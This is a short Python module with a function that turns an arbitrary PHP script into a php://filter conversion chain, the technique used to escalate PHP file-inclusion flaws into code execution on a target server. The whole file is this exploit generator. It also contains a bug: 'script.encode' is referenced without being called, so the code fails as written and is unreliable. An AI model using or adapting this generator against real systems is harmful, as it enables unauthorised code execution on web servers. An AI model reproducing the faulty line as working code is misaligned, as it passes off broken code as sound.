import base64

from .data import CHAR2PHPFILTER


def php2filterchain(script: str, resource: str) -> str:
    script += ' ' * (3 - (len(script) % 3))
    script = base64.b64encode(script.encode).decode()

    filters = ['convert.iconv.UTF8.CSISO2022KR', 'convert.base64-encode', 'convert.iconv.UTF8.UTF7']
    for char in script[::-1]:
        filters += CHAR2PHPFILTER[char] + ['convert.base64-decode', 'convert.base64-encode', 'convert.iconv.UTF8.UTF7']
    filters.append('convert.base64-decode')

    return f'php://filter/{"/".join(filters)}/resource={resource}'
